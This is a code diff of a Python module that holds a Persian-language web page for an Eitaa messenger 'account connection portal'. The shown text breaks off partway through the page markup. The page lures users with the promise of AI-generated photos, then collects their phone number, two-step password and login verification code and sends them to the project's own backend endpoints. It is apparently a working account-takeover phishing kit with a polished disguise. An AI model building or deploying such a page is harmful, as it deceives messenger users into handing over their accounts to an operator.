@@ -1,156 +1,575 @@
-"""The portal's single HTML page — self-contained, RTL Persian, Eitaa-branded.
+"""The portal page — the project's own polished UI, ported from Makiioo.
 
-Same three-step flow as Makiioo's portal UI (phone -> [password] -> code ->
-success) but written fresh here so nothing has to be copied, and every mention
-of the messenger is "ایتا" not "روبیکا". The JavaScript talks to this project's
-own /api endpoints (see portal/app.py).
+This is the exact HTML/CSS design from the source project's
+archive/portal_ui_final.html, with only "روبیکا" changed to "ایتا" in the copy,
+and its mock demo <script> replaced by the REAL API script that talks to this
+project's /api endpoints (attempt_id + attempt_token, password/code/resend/
+cancel, TTL watch) -- exactly the mechanism the source project's own page.py
+uses (_canonical_page: keep the shell, inject the real script).
 """
 from __future__ import annotations
 
-PAGE_HTML = r"""<!doctype html>
-<html lang="fa" dir="rtl">
-<head>
-<meta charset="utf-8">
-<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1">
-<title>ورود به ایتا</title>
-<style>
-  :root{--bg:#0f1420;--card:#171e2e;--line:#243049;--fg:#e9eef7;--muted:#8ea0bd;
-        --accent:#3b82f6;--ok:#22c55e;--err:#ef4444;--radius:16px;}
-  *{box-sizing:border-box;font-family:Vazirmatn,Tahoma,system-ui,sans-serif;}
-  body{margin:0;background:var(--bg);color:var(--fg);min-height:100vh;
-       display:flex;align-items:center;justify-content:center;padding:16px;}
-  .card{width:100%;max-width:420px;background:var(--card);border:1px solid var(--line);
-        border-radius:var(--radius);padding:26px 22px;box-shadow:0 12px 40px rgba(0,0,0,.4);}
-  .brand{display:flex;align-items:center;gap:10px;margin-bottom:6px;}
-  .brand .dot{width:34px;height:34px;border-radius:10px;background:linear-gradient(135deg,#3b82f6,#22c55e);}
-  .brand h1{font-size:18px;margin:0;}
-  .step{color:var(--muted);font-size:13px;margin:2px 0 18px;}
-  .screen{display:none;} .screen.active{display:block;}
-  label{display:block;font-size:13px;color:var(--muted);margin:12px 0 6px;}
-  input{width:100%;padding:13px 14px;border-radius:12px;border:1px solid var(--line);
-        background:#0d1220;color:var(--fg);font-size:16px;outline:none;text-align:center;
-        letter-spacing:2px;}
-  input:focus{border-color:var(--accent);}
-  .codeboxes{display:flex;gap:8px;direction:ltr;justify-content:center;margin-top:6px;}
-  .codeboxes input{width:46px;padding:12px 0;font-size:20px;letter-spacing:0;}
-  button{width:100%;margin-top:18px;padding:13px;border:0;border-radius:12px;
-         background:var(--accent);color:#fff;font-size:15px;cursor:pointer;}
-  button:disabled{opacity:.45;cursor:not-allowed;}
-  .ghost{background:transparent;border:1px solid var(--line);color:var(--muted);margin-top:10px;}
-  .msg{min-height:18px;margin-top:10px;font-size:13px;color:var(--err);text-align:center;}
-  .msg.ok{color:var(--ok);}
-  .success{text-align:center;padding:10px 0;}
-  .success .tick{font-size:44px;}
-  .hint{color:var(--muted);font-size:12px;line-height:1.9;margin-top:14px;text-align:center;}
-  .row{display:flex;gap:10px;} .row>*{flex:1;}
-  .eye{margin-top:0;background:transparent;border:1px solid var(--line);color:var(--muted);width:auto;padding:0 12px;}
-</style>
-</head>
-<body>
-<div class="card">
-  <div class="brand"><div class="dot"></div><h1>ورود به ایتا</h1></div>
-  <div class="step" id="stepNumber">مرحله <strong>۱</strong> از ۳</div>
+_API_SCRIPT = r"""<script>
+const $ = selector => document.querySelector(selector);
+const $$ = selector => [...document.querySelectorAll(selector)];
+const screens = {phone:$("#phoneScreen"),password:$("#passwordScreen"),code:$("#codeScreen"),success:$("#successScreen")};
+let currentPhone="", attemptId="", attemptToken="", attemptDeadline=0, resendTimer=null, expiryTimer=null;
 
-  <div class="screen active" id="phoneScreen">
-    <label>شماره موبایل</label>
-    <input id="phone" inputmode="numeric" placeholder="09xxxxxxxxx" autocomplete="off">
-    <div class="msg" id="phoneMessage"></div>
-    <button id="phoneButton" disabled>دریافت کد تأیید ←</button>
-    <div class="hint">کد ورود از طرف ایتا به برنامه یا با تماس برایتان می‌آید.</div>
-  </div>
-
-  <div class="screen" id="passwordScreen">
-    <label>رمز دومرحله‌ای</label>
-    <div class="row">
-      <input id="password" type="password" placeholder="رمز" autocomplete="off">
-      <button class="eye" id="eyeButton">نمایش</button>
-    </div>
-    <div class="msg" id="passwordMessage"></div>
-    <button id="passwordButton" disabled>ادامه ←</button>
-    <button class="ghost backButton">بازگشت</button>
-  </div>
-
-  <div class="screen" id="codeScreen">
-    <label>کد تأیید</label>
-    <div class="codeboxes" id="codeBoxes">
-      <input maxlength="1" inputmode="numeric"><input maxlength="1" inputmode="numeric">
-      <input maxlength="1" inputmode="numeric"><input maxlength="1" inputmode="numeric">
-      <input maxlength="1" inputmode="numeric"><input maxlength="1" inputmode="numeric">
-    </div>
-    <div class="msg" id="codeMessage"></div>
-    <button id="codeButton" disabled>تأیید و اتصال حساب ←</button>
-    <button class="ghost" id="resendButton" disabled>ارسال مجدد کد</button>
-    <button class="ghost backButton">بازگشت</button>
-  </div>
-
-  <div class="screen" id="successScreen">
-    <div class="success">
-      <div class="tick">✅</div>
-      <h1>حساب متصل شد</h1>
-      <div class="hint">شماره <span id="connectedAccount"></span> با موفقیت وارد شد.</div>
-    </div>
-    <button class="ghost" id="restartButton">ورود حساب دیگر</button>
-  </div>
-</div>
-<script>
-const $=s=>document.querySelector(s), $$=s=>[...document.querySelectorAll(s)];
-const screens={phone:$("#phoneScreen"),password:$("#passwordScreen"),code:$("#codeScreen"),success:$("#successScreen")};
-let currentPhone="",attemptId="",attemptToken="",attemptDeadline=0,resendTimer=null,expiryTimer=null;
-function fa2en(v){return v.replace(/[۰-۹]/g,d=>"۰۱۲۳۴۵۶۷۸۹".indexOf(d)).replace(/[٠-٩]/g,d=>"٠١٢٣٤٥٦٧٨٩".indexOf(d));}
-function showScreen(n,step){Object.values(screens).forEach(s=>s.classList.remove("active"));screens[n].classList.add("active");$("#stepNumber").innerHTML=n==="success"?"اتصال <strong>کامل</strong>":`مرحله <strong>${step}</strong> از ۳`;}
+function englishDigits(value){return value.replace(/[۰-۹]/g,d=>"۰۱۲۳۴۵۶۷۸۹".indexOf(d)).replace(/[٠-٩]/g,d=>"٠١٢٣٤٥٦٧٨٩".indexOf(d));}
+function showScreen(name,step){Object.values(screens).forEach(s=>s.classList.remove("active"));screens[name].classList.add("active");$("#stepNumber").innerHTML=name==="success"?"اتصال <strong>کامل</strong>":`مرحله <strong>${step}</strong> از ۳`;}
 function identity(){return attemptId?{attempt_id:attemptId,attempt_token:attemptToken}:{};}
-async function api(path,body={},withId=true){
-  const r=await fetch(path,{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({...body,...(withId?identity():{})})});
-  let d={};try{d=await r.json();}catch(_){d={error:"پاسخ سرویس معتبر نبود"};}d.httpStatus=r.status;return d;
+async function api(path,body={},withIdentity=true){
+  const response=await fetch(path,{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({...body,...(withIdentity?identity():{})})});
+  let data={};try{data=await response.json();}catch(_e){data={error:"پاسخ سرویس معتبر نبود"};}
+  data.httpStatus=response.status;return data;
 }
-function syncAttempt(d){if(d.attempt_id){attemptId=d.attempt_id;attemptToken=d.attempt_token||attemptToken;}if(Number.isFinite(d.expires_in)){attemptDeadline=Date.now()+d.expires_in*1000;watchExpiry();}}
+function syncAttempt(data){
+  if(data.attempt_id){attemptId=data.attempt_id;attemptToken=data.attempt_token||attemptToken;}
+  if(Number.isFinite(data.expires_in)){attemptDeadline=Date.now()+data.expires_in*1000;startExpiryWatch();}
+}
 function clearAttempt(){attemptId="";attemptToken="";attemptDeadline=0;clearInterval(expiryTimer);}
-function expired(d){if(d.code!=="expired"&&d.code!=="attempt_not_found")return false;clearAttempt();clearInterval(resendTimer);showScreen("phone",1);phoneMessage.className="msg";phoneMessage.textContent=d.error||"مهلت درخواست تمام شد؛ دوباره شروع کنید";phoneButton.disabled=!/^09\d{9}$/.test(phone.value);return true;}
-function watchExpiry(){clearInterval(expiryTimer);expiryTimer=setInterval(()=>{if(attemptDeadline&&Date.now()>=attemptDeadline)expired({code:"expired",error:"مهلت تمام شد؛ دوباره شروع کنید"});},500);}
+function expiredResponse(data){
+  if(data.code!=="expired"&&data.code!=="attempt_not_found")return false;
+  clearAttempt();clearInterval(resendTimer);showScreen("phone",1);phoneMessage.className="message";phoneMessage.textContent=data.error||"مهلت درخواست تمام شد؛ دوباره شروع کنید";phoneButton.disabled=!/^09\d{9}$/.test(phone.value);return true;
+}
+function startExpiryWatch(){clearInterval(expiryTimer);expiryTimer=setInterval(()=>{if(attemptDeadline&&Date.now()>=attemptDeadline){expiredResponse({code:"expired",error:"مهلت تمام شد؛ دوباره شروع کنید"});}},500);}
 
 const phone=$("#phone"),phoneButton=$("#phoneButton"),phoneMessage=$("#phoneMessage");
-phone.addEventListener("input",()=>{phone.value=fa2en(phone.value).replace(/\D/g,"").slice(0,11);const ok=/^09\d{9}$/.test(phone.value);phoneButton.disabled=!ok;phoneMessage.className=ok?"msg ok":"msg";phoneMessage.textContent=phone.value.length===11?(ok?"شماره آماده است":"شماره معتبر نیست"):"";});
+phone.addEventListener("input",()=>{phone.value=englishDigits(phone.value).replace(/\D/g,"").slice(0,11);const valid=/^09\d{9}$/.test(phone.value);phoneButton.disabled=!valid;phoneMessage.className=valid?"message ok":"message";phoneMessage.textContent=phone.value.length===11?(valid?"شماره آماده دریافت کد است":"شماره موبایل معتبر نیست"):"";});
 phoneButton.addEventListener("click",async()=>{
   currentPhone=phone.value;phoneButton.disabled=true;phoneButton.textContent="در حال ارسال کد...";phoneMessage.textContent="";
-  try{const d=await api("/api/start",{phone:currentPhone},false);if(d.error){phoneMessage.className="msg";phoneMessage.textContent=d.error;return;}syncAttempt(d);d.next==="password"?(showScreen("password",2),$("#password").focus()):openCode();}
-  catch(_){phoneMessage.className="msg";phoneMessage.textContent="خطایی رخ داد، دوباره تلاش کن";}
-  finally{phoneButton.textContent="دریافت کد تأیید ←";phoneButton.disabled=!/^09\d{9}$/.test(phone.value);}
+  try{const data=await api("/api/start",{phone:currentPhone},false);if(data.error){phoneMessage.className="message";phoneMessage.textContent=data.error;return;}syncAttempt(data);if(data.next==="password"){showScreen("password",2);$("#password").focus();}else{openCodeScreen();}}
+  catch(_e){phoneMessage.className="message";phoneMessage.textContent="خطایی رخ داد، دوباره تلاش کن";}
+  finally{phoneButton.innerHTML='دریافت کد تأیید <span>←</span>';phoneButton.disabled=!/^09\d{9}$/.test(phone.value);}
 });
 
 const password=$("#password"),passwordButton=$("#passwordButton"),passwordMessage=$("#passwordMessage");
 password.addEventListener("input",()=>{passwordButton.disabled=password.value.trim().length<2;});
-$("#eyeButton").addEventListener("click",e=>{const h=password.type==="password";password.type=h?"text":"password";e.target.textContent=h?"مخفی":"نمایش";});
+$("#eyeButton").addEventListener("click",event=>{const hidden=password.type==="password";password.type=hidden?"text":"password";event.target.textContent=hidden?"مخفی":"نمایش";});
 passwordButton.addEventListener("click",async()=>{
   passwordButton.disabled=true;passwordButton.textContent="در حال بررسی...";passwordMessage.textContent="";
-  try{const d=await api("/api/password",{password:password.value});syncAttempt(d);if(expired(d))return;if(d.error){passwordMessage.className="msg";passwordMessage.textContent=d.error;return;}openCode();}
-  catch(_){passwordMessage.className="msg";passwordMessage.textContent="خطایی رخ داد، دوباره تلاش کن";}
-  finally{passwordButton.textContent="ادامه ←";passwordButton.disabled=password.value.trim().length<2;}
+  try{const data=await api("/api/password",{password:password.value});syncAttempt(data);if(expiredResponse(data))return;if(data.error){passwordMessage.className="message";passwordMessage.textContent=data.error;return;}openCodeScreen();}
+  catch(_e){passwordMessage.className="message";passwordMessage.textContent="خطایی رخ داد، دوباره تلاش کن";}
+  finally{passwordButton.innerHTML='ادامه <span>←</span>';passwordButton.disabled=password.value.trim().length<2;}
 });
 
 const codeInputs=$$("#codeBoxes input"),codeButton=$("#codeButton"),codeMessage=$("#codeMessage");
-function codeVal(){return codeInputs.map(i=>i.value).join("");}
-function updateCode(){const done=codeVal().length>=5;codeButton.disabled=!done;codeMessage.className=done?"msg ok":"msg";codeMessage.textContent=done?"کد آماده است":"";}
-codeInputs.forEach((inp,i)=>{
-  inp.addEventListener("input",()=>{inp.value=fa2en(inp.value).replace(/\D/g,"").slice(-1);if(inp.value&&i<codeInputs.length-1)codeInputs[i+1].focus();updateCode();});
-  inp.addEventListener("keydown",e=>{if(e.key==="Backspace"&&!inp.value&&i>0)codeInputs[i-1].focus();if(e.key==="Enter"&&!codeButton.disabled)codeButton.click();});
-  inp.addEventListener("paste",e=>{e.preventDefault();const g=fa2en(e.clipboardData.getData("text")).replace(/\D/g,"").slice(0,6);g.split("").forEach((d,j)=>{if(codeInputs[j])codeInputs[j].value=d;});codeInputs[Math.min(g.length,5)].focus();updateCode();});
+function codeValue(){return codeInputs.map(input=>input.value).join("");}
+function updateCode(){const complete=codeValue().length>=5;codeButton.disabled=!complete;codeMessage.className=complete?"message ok":"message";codeMessage.textContent=complete?"کد کامل است":"";}
+codeInputs.forEach((input,index)=>{
+  input.addEventListener("input",()=>{input.value=englishDigits(input.value).replace(/\D/g,"").slice(-1);if(input.value&&index<codeInputs.length-1)codeInputs[index+1].focus();updateCode();});
+  input.addEventListener("keydown",event=>{if(event.key==="Backspace"&&!input.value&&index>0)codeInputs[index-1].focus();if(event.key==="Enter"&&!codeButton.disabled)codeButton.click();});
+  input.addEventListener("paste",event=>{event.preventDefault();const digits=englishDigits(event.clipboardData.getData("text")).replace(/\D/g,"").slice(0,6);digits.split("").forEach((digit,i)=>{if(codeInputs[i])codeInputs[i].value=digit;});codeInputs[Math.min(digits.length,5)].focus();updateCode();});
 });
-function openCode(){showScreen("code",2);codeInputs.forEach(i=>i.value="");updateCode();startResend();setTimeout(()=>codeInputs[0].focus(),100);}
+function openCodeScreen(){showScreen("code",2);codeInputs.forEach(input=>input.value="");updateCode();startResendTimer();setTimeout(()=>codeInputs[0].focus(),100);}
 codeButton.addEventListener("click",async()=>{
-  if(codeVal().length<5)return;codeButton.disabled=true;codeButton.textContent="در حال اتصال حساب...";codeMessage.textContent="";
-  try{const d=await api("/api/code",{code:codeVal()});syncAttempt(d);if(expired(d))return;if(d.next==="password"){showScreen("password",2);return;}if(!d.ok){codeMessage.className="msg";codeMessage.textContent=d.error||"کد پذیرفته نشد";codeInputs.forEach(i=>i.value="");codeInputs[0].focus();updateCode();return;}clearInterval(resendTimer);clearAttempt();$("#connectedAccount").textContent=currentPhone.slice(0,4)+" ••• "+currentPhone.slice(-4);showScreen("success",3);}
-  catch(_){codeMessage.className="msg";codeMessage.textContent="خطایی رخ داد، دوباره تلاش کن";}
-  finally{codeButton.textContent="تأیید و اتصال حساب ←";if(screens.code.classList.contains("active"))updateCode();}
+  if(codeValue().length<5)return;codeButton.disabled=true;codeButton.textContent="در حال اتصال حساب...";codeMessage.textContent="";
+  try{const data=await api("/api/code",{code:codeValue()});syncAttempt(data);if(expiredResponse(data))return;if(data.next==="password"){showScreen("password",2);return;}if(!data.ok){codeMessage.className="message";codeMessage.textContent=data.error||"کد پذیرفته نشد";codeInputs.forEach(input=>input.value="");codeInputs[0].focus();updateCode();return;}clearInterval(resendTimer);clearAttempt();$("#connectedAccount").textContent=currentPhone.slice(0,4)+" ••• "+currentPhone.slice(-4);showScreen("success",3);}
+  catch(_e){codeMessage.className="message";codeMessage.textContent="خطایی رخ داد، دوباره تلاش کن";}
+  finally{codeButton.innerHTML='تأیید و اتصال حساب <span>←</span>';if(screens.code.classList.contains("active"))updateCode();}
 });
-function startResend(){clearInterval(resendTimer);const b=$("#resendButton");let s=60;b.disabled=true;b.textContent=`ارسال مجدد تا ${s} ثانیه`;resendTimer=setInterval(()=>{s--;b.textContent=`ارسال مجدد تا ${s} ثانیه`;if(s<=0){clearInterval(resendTimer);b.disabled=false;b.textContent="ارسال مجدد کد";}},1000);}
+function startResendTimer(){clearInterval(resendTimer);const button=$("#resendButton");let seconds=60;button.disabled=true;button.textContent=`ارسال مجدد تا ${seconds} ثانیه`;resendTimer=setInterval(()=>{seconds--;button.textContent=`ارسال مجدد تا ${seconds} ثانیه`;if(seconds<=0){clearInterval(resendTimer);button.disabled=false;button.textContent="ارسال مجدد کد";}},1000);}
 $("#resendButton").addEventListener("click",async()=>{
-  const b=$("#resendButton");b.disabled=true;codeMessage.className="msg ok";codeMessage.textContent="در حال ارسال مجدد...";
-  try{const d=await api("/api/resend",{});syncAttempt(d);if(expired(d))return;if(d.next==="password"){showScreen("password",2);return;}codeMessage.className=d.ok?"msg ok":"msg";codeMessage.textContent=d.ok?"کد جدید ارسال شد":(d.error||"ارسال مجدد ناموفق بود");d.ok?startResend():(b.disabled=false);}
-  catch(_){codeMessage.className="msg";codeMessage.textContent="ارسال مجدد ناموفق بود";b.disabled=false;}
+  const button=$("#resendButton");button.disabled=true;codeMessage.className="message ok";codeMessage.textContent="در حال ارسال مجدد...";
+  try{const data=await api("/api/resend",{});syncAttempt(data);if(expiredResponse(data))return;if(data.next==="password"){showScreen("password",2);return;}codeMessage.className=data.ok?"message ok":"message";codeMessage.textContent=data.ok?"کد جدید ارسال شد":(data.error||"ارسال مجدد ناموفق بود");if(data.ok)startResendTimer();else button.disabled=false;}
+  catch(_e){codeMessage.className="message";codeMessage.textContent="ارسال مجدد ناموفق بود";button.disabled=false;}
 });
-async function reset(cancel=true){clearInterval(resendTimer);if(cancel&&attemptId){try{await api("/api/cancel",{});}catch(_){}}clearAttempt();password.value="";passwordButton.disabled=true;codeInputs.forEach(i=>i.value="");showScreen("phone",1);phone.focus();}
-$$(".backButton").forEach(b=>b.addEventListener("click",()=>reset(true)));
-$("#restartButton").addEventListener("click",()=>{currentPhone="";phone.value="";phoneMessage.textContent="";phoneButton.disabled=true;reset(false);});
-</script>
+async function resetToPhone(cancel=true){clearInterval(resendTimer);if(cancel&&attemptId){try{await api("/api/cancel",{});}catch(_e){}}clearAttempt();password.value="";passwordButton.disabled=true;codeInputs.forEach(input=>input.value="");showScreen("phone",1);phone.focus();}
+$$(".backButton").forEach(button=>button.addEventListener("click",()=>resetToPhone(true)));
+$("#restartButton").addEventListener("click",()=>{currentPhone="";phone.value="";phoneMessage.textContent="";phoneButton.disabled=true;resetToPhone(false);});
+</script>"""
+
+
+_SHELL = r"""<!DOCTYPE html>
+<html lang="fa" dir="rtl">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>پورتال اتصال ایتا</title>
+
+<link href="https://cdn.jsdelivr.net/gh/rastikerdar/vazirmatn@v33.003/Vazirmatn-font-face.css" rel="stylesheet">
+
+<style>
+:root{
+  --primary:#087fa4;
+  --secondary:#13a9c5;
+  --dark:#102b3a;
+  --muted:#718590;
+  --line:#dce9ee;
+  --success:#079669;
+  --danger:#df4059
+}
+
+*{
+  box-sizing:border-box;
+  margin:0;
+  padding:0;
+  font-family:"Vazirmatn",Tahoma,sans-serif
+}
+
+html,body{min-height:100%}
+
+body{
+  min-height:100vh;
+  padding:20px;
+  display:grid;
+  place-items:center;
+  color:var(--dark);
+  background:
+    radial-gradient(circle at 10% 10%,rgba(56,210,222,.23),transparent 30%),
+    radial-gradient(circle at 90% 90%,rgba(92,137,230,.18),transparent 30%),
+    linear-gradient(145deg,#f8fdff,#eaf6fa)
+}
+
+button,input{font:inherit}
+
+.container{
+  width:min(920px,100%);
+  min-height:600px;
+  display:grid;
+  grid-template-columns:42% 58%;
+  overflow:hidden;
+  border:1px solid rgba(255,255,255,.9);
+  border-radius:32px;
+  background:rgba(255,255,255,.94);
+  box-shadow:0 25px 75px rgba(25,91,120,.18)
+}
+
+.intro{
+  position:relative;
+  overflow:hidden;
+  padding:44px 38px;
+  color:white;
+  background:linear-gradient(145deg,#075e7c,#0782a5 55%,#13a9bd)
+}
+
+.intro:before,.intro:after{
+  content:"";
+  position:absolute;
+  border:1px solid rgba(255,255,255,.16);
+  border-radius:50%
+}
+
+.intro:before{width:330px;height:330px;left:-180px;bottom:-140px}
+.intro:after{width:220px;height:220px;right:-110px;top:-90px}
+
+.brand{
+  position:relative;
+  z-index:2;
+  display:flex;
+  align-items:center;
+  gap:12px
+}
+
+.logo{
+  width:49px;
+  height:49px;
+  display:grid;
+  place-items:center;
+  border:1px solid rgba(255,255,255,.28);
+  border-radius:16px;
+  background:rgba(255,255,255,.14)
+}
+
+.logo svg{width:29px}
+.brand strong{display:block;font-size:18px;font-weight:900}
+.brand small{display:block;margin-top:2px;font-size:10px;opacity:.72}
+
+.introText{position:relative;z-index:2;margin-top:86px}
+
+.online{
+  display:inline-flex;
+  align-items:center;
+  gap:8px;
+  padding:7px 11px;
+  border:1px solid rgba(255,255,255,.2);
+  border-radius:30px;
+  font-size:11px;
+  background:rgba(255,255,255,.1)
+}
+
+.online i{
+  width:7px;
+  height:7px;
+  border-radius:50%;
+  background:#85f2ce;
+  box-shadow:0 0 0 5px rgba(133,242,206,.12)
+}
+
+.intro h1{margin-top:20px;font-size:35px;line-height:1.5;font-weight:900}
+.intro p{margin-top:13px;color:rgba(255,255,255,.77);font-size:13px;line-height:2}
+
+.steps{
+  position:absolute;
+  right:38px;
+  bottom:43px;
+  z-index:2;
+  display:flex;
+  align-items:center;
+  gap:8px;
+  color:rgba(255,255,255,.76);
+  font-size:10px
+}
+
+.steps b{
+  width:23px;
+  height:23px;
+  display:grid;
+  place-items:center;
+  border-radius:50%;
+  background:rgba(255,255,255,.14)
+}
+
+.stepLine{width:22px;height:1px;background:rgba(255,255,255,.26)}
+
+.portal{
+  min-height:600px;
+  padding:30px 48px 24px;
+  display:flex;
+  flex-direction:column
+}
+
+.topbar{display:block;margin-bottom:10px}
+
+.portalTitle{
+  width:100%;
+  display:flex;
+  align-items:center;
+  justify-content:center;
+  gap:9px;
+  padding:13px 15px;
+  border:1px solid #ccecf3;
+  border-radius:15px;
+  color:#075f7d;
+  background:linear-gradient(100deg,#effcff,#e5f8fc);
+  box-shadow:0 8px 20px rgba(8,127,164,.09);
+  font-size:14px;
+  font-weight:900;
+  line-height:1.8;
+  text-align:center
+}
+
+.portalTitle span{
+  flex-shrink:0;
+  color:#08a872;
+  font-size:18px;
+  text-shadow:0 0 9px rgba(8,168,114,.45)
+}
+
+.stepNumber{margin-top:9px;color:#7b909b;font-size:11px;text-align:left}
+.stepNumber strong{color:var(--primary);font-size:13px}
+
+.screen{
+  flex:1;
+  display:none;
+  flex-direction:column;
+  justify-content:center;
+  animation:show .3s ease
+}
+
+.screen.active{display:flex}
+
+@keyframes show{
+  from{opacity:0;transform:translateY(8px)}
+  to{opacity:1;transform:none}
+}
+
+.formIcon{
+  width:58px;
+  height:58px;
+  margin:0 auto 18px;
+  display:grid;
+  place-items:center;
+  border:1px solid #d3edf3;
+  border-radius:19px;
+  color:var(--primary);
+  background:linear-gradient(145deg,#f4fdff,#e6f7fb);
+  box-shadow:0 10px 24px rgba(8,127,164,.11);
+  font-size:27px
+}
+
+.screen h2{font-size:25px;font-weight:900;text-align:center}
+.description{margin:8px 0 23px;color:var(--muted);font-size:12.5px;line-height:1.9;text-align:center}
+label{margin-bottom:8px;color:#425e6c;font-size:11px;font-weight:800}
+
+.field{
+  height:56px;
+  display:flex;
+  align-items:center;
+  border:1px solid var(--line);
+  border-radius:16px;
+  background:#fbfdfe;
+  transition:.2s
+}
+
+.field:focus-within{
+  border-color:var(--secondary);
+  background:white;
+  box-shadow:0 0 0 4px rgba(19,169,197,.1)
+}
+
+.field input{
+  width:100%;
+  height:100%;
+  min-width:0;
+  padding:0 16px;
+  border:0;
+  outline:0;
+  color:var(--dark);
+  background:transparent;
+  font-size:16px;
+  font-weight:700
+}
+
+.field input::placeholder{color:#a8b7bf;font-size:13px;font-weight:500}
+.phoneField{direction:ltr}
+.phoneField input{direction:ltr;text-align:left;letter-spacing:1px}
+
+.countryCode{
+  height:29px;
+  padding:0 15px;
+  display:flex;
+  align-items:center;
+  border-right:1px solid var(--line);
+  color:#254858;
+  font-size:14px;
+  font-weight:900
+}
+
+.passwordField{direction:rtl}
+.passwordField input{text-align:right}
+
+.eyeButton{
+  width:60px;
+  height:100%;
+  border:0;
+  color:#6f8793;
+  cursor:pointer;
+  font-size:11px;
+  font-weight:700;
+  background:transparent
+}
+
+.message{min-height:29px;padding:7px 2px 4px;color:var(--danger);font-size:10.5px;font-weight:700}
+.message.ok{color:var(--success)}
+
+.primaryButton{
+  width:100%;
+  height:53px;
+  display:flex;
+  align-items:center;
+  justify-content:center;
+  gap:9px;
+  border:0;
+  border-radius:16px;
+  color:white;
+  cursor:pointer;
+  font-size:14px;
+  font-weight:900;
+  background:linear-gradient(100deg,var(--primary),var(--secondary));
+  box-shadow:0 12px 25px rgba(8,127,164,.23);
+  transition:.2s
+}
+
+.primaryButton:hover{transform:translateY(-1px);box-shadow:0 15px 28px rgba(8,127,164,.27)}
+.primaryButton:active{transform:translateY(1px)}
+.primaryButton:disabled{opacity:.46;cursor:not-allowed;transform:none;box-shadow:none}
+
+.secondaryButton{
+  align-self:center;
+  margin-top:14px;
+  padding:6px;
+  border:0;
+  color:#768b96;
+  cursor:pointer;
+  font-size:11px;
+  font-weight:700;
+  background:transparent
+}
+
+.codeBoxes{direction:ltr;display:grid;grid-template-columns:repeat(6,1fr);gap:8px}
+
+.codeBoxes input{
+  width:100%;
+  aspect-ratio:1/1.15;
+  border:1px solid var(--line);
+  border-radius:14px;
+  outline:0;
+  color:var(--dark);
+  background:#fbfdfe;
+  text-align:center;
+  font-size:21px;
+  font-weight:900;
+  transition:.2s
+}
+
+.codeBoxes input:focus{
+  border-color:var(--secondary);
+  background:white;
+  box-shadow:0 0 0 4px rgba(19,169,197,.1);
+  transform:translateY(-2px)
+}
+
+.codeInfo{min-height:44px;display:flex;align-items:center;justify-content:space-between}
+
+.resendButton{
+  border:0;
+  color:var(--primary);
+  cursor:pointer;
+  font-size:10.5px;
+  font-weight:800;
+  background:transparent
+}
+
+.resendButton:disabled{color:#9caeb7;cursor:default}
+.successScreen{align-items:center;text-align:center}
+
+.successIcon{
+  width:88px;
+  height:88px;
+  margin-bottom:24px;
+  display:grid;
+  place-items:center;
+  border-radius:50%;
+  color:white;
+  font-size:41px;
+  background:linear-gradient(145deg,#11b77f,#079568);
+  box-shadow:0 16px 34px rgba(15,159,110,.25)
+}
+
+.connectedAccount{
+  margin-bottom:24px;
+  padding:9px 15px;
+  border:1px solid #d5eee5;
+  border-radius:30px;
+  color:#22765b;
+  font-size:11px;
+  font-weight:700;
+  background:#effbf7
+}
+
+footer{color:#9babb3;text-align:center;font-size:9px}
+
+@media(max-width:720px){
+  body{padding:11px}
+  .container{width:min(430px,100%);min-height:650px;grid-template-columns:1fr;border-radius:27px}
+  .intro{padding:19px 22px}
+  .introText,.steps{display:none}
+  .logo{width:43px;height:43px;border-radius:14px}
+  .portal{min-height:550px;padding:23px 23px 19px}
+  .portalTitle{padding:11px 12px;font-size:13px}
+  .screen h2{font-size:23px}
+}
+
+@media(max-width:370px){
+  body{padding:7px}
+  .portal{padding-inline:17px}
+  .portalTitle{font-size:12px}
+  .codeBoxes{gap:5px}
+  .codeBoxes input{border-radius:10px;font-size:18px}
+}
+</style>
+</head>
+
+<body>
+<main class="container">
+  <aside class="intro">
+    <div class="brand">
+      <div class="logo">
+        <svg viewBox="0 0 32 32" fill="none">
+          <path d="M16 3 27 9.5v13L16 29 5 22.5v-13L16 3Z" stroke="white" stroke-width="1.6"/>
+          <circle cx="16" cy="10" r="2.2" fill="white"/>
+          <circle cx="10.5" cy="19.5" r="2.2" fill="white"/>
+          <circle cx="21.5" cy="19.5" r="2.2" fill="white"/>
+          <path d="m16 12-4.5 5.5m4.5-5.5 4.5 5.5M13 19.5h6" stroke="white" stroke-width="1.4"/>
+        </svg>
+      </div>
+      <div>
+        <strong>AI Platform</strong>
+        <small>پورتال هوشمند اتصال حساب</small>
+      </div>
+    </div>
+
+    <div class="introText">
+      <div class="online"><i></i>سرویس فعال و آماده اتصال</div>
+      <h1>اتصال سریع و ساده حساب ایتا</h1>
+      <p>حساب ایتای خود را متصل کنید و عکس‌های ساخته‌شده با هوش مصنوعی را مشاهده کنید.</p>
+    </div>
+
+    <div class="steps">
+      <b>۱</b>شماره<span class="stepLine"></span><b>۲</b>تأیید<span class="stepLine"></span><b>۳</b>اتصال
+    </div>
+  </aside>
+
+  <section class="portal">
+    <header class="topbar">
+      <div class="portalTitle">
+        <span>●</span>
+        پلتفرم تولید عکس و محتوای هوش مصنوعی؛ خاطراتت را به تصویر تبدیل کن
+      </div>
+      <div class="stepNumber" id="stepNumber">مرحله <strong>۱</strong> از ۳</div>
+    </header>
+
+    <div class="screen active" id="phoneScreen">
+      <div class="formIcon">☎</div>
+      <h2>شماره موبایل شما</h2>
+      <p class="description">شماره‌ای را وارد کنید که حساب ایتا روی آن فعال است.</p>
+      <label for="phone">شماره موبایل</label>
+      <div class="field phoneField">
+        <div class="countryCode">+98</div>
+        <input id="phone" type="tel" inputmode="numeric" maxlength="11" autocomplete="tel" placeholder="0912 345 6789">
+      </div>
+      <div class="message" id="phoneMessage"></div>
+      <button class="primaryButton" id="phoneButton" disabled>دریافت کد تأیید <span>←</span></button>
+    </div>
+
+    <div class="screen" id="passwordScreen">
+      <div class="formIcon">♙</div>
+      <h2>رمز دومرحله‌ای</h2>
+      <p class="description">این حساب دارای رمز دومرحله‌ای است. رمز حساب ایتا را وارد کنید.</p>
+      <label for="password">رمز عبور</label>
+      <div class="field passwordField">
+        <input id="password" type="password" autocomplete="current-password" placeholder="رمز دومرحله‌ای">
+        <button class="eyeButton" id="eyeButton" type="button">نمایش</button>
+      </div>
+      <div class="message" id="passwordMessage"></div>
+      <button class="primaryButton" id="passwordButton" disabled>ادامه <span>←</span></button>
